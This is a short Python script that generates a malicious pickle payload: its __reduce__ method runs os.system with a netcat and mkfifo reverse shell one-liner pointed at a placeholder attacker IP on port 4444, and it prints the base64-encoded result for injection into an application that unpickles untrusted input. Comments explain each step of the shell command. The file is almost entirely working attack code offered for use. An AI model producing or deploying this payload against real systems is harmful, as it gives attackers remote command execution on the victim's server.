# This file will help create a rreverse shell on a unix system. 
# when run, connecting to the remote server on that port i.e 4444 opens a shell prompt and 
# the client can execute arbitrary commands.

# !/user/bin/python3

import pickle
import sys
import base64

# Your attack IP will need to have a port (4444) open and listening before executing the attack
command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_attack_IP 4444 > /tmp/f'
# rm /tmp/f; removes the tmp/f file if it exists
# mkfifo /tmp/f; mkfifo() makes a FIFO special file with name pathname(/tmp/f)
# cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_attack_IP 4444 > /tmp/f;  
#   cat /tmp/f is printing whatever is written to that named pipe and the output of cat /tmp/f is been piped to /bin/sh
# /bin/sh is running interactively and stderr is redirected to stdout.
# the output is then piped to netCat YOUR_attack_IP, which is listening on port 4444
# and the out put is finally redirected to the named pipe again.



class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
